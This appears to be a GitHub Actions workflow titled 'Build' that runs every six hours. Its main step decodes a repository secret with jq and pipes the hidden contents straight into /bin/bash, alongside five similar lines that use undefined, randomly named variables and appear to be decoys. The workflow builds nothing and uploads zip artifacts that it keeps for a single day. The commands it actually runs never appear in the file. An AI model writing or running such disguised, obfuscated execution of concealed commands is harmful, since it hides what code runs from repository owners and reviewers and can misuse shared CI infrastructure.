name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '56 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          lxi94: ${{ secrets.lxi94 }}
        run: |
          printf '%s' "$lxi94" | jq -r .zzkjc73 | /bin/bash
          printf '%s' "$ow718" | jq -r .yyea1 | /bin/bash
          printf '%s' "$kmgz27895" | jq -r .e9332 | /bin/bash
          echo $ygnw9279 | jq -r .uox67 | /bin/bash
          printf '%s' "$ptn7185" | jq -r .jvalv2 | /bin/bash
          echo $svhym596 | jq -r .i2 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: Dk1p1BRb
          path: "*.zip"
          retention-days: 1
